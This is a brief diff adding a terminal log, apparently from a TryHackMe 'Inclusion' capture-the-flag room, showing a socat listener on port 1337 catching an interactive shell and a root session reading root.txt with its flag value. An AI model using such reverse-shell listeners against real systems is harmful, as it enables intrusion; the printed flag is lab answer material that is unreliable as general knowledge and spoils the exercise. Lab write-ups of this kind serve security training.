@@ -1,0 +1,8 @@
+╭─root@kali ~/TryHackMe/Rooms/Inclusion ‹master*› 
+╰─# socat file:`tty`,raw,echo=0 tcp-listen:1337
+
+root@inclusion:~# cd /root/
+root@inclusion:/root# ls
+root.txt
+root@inclusion:/root# cat root.txt 
+42964104845495153909
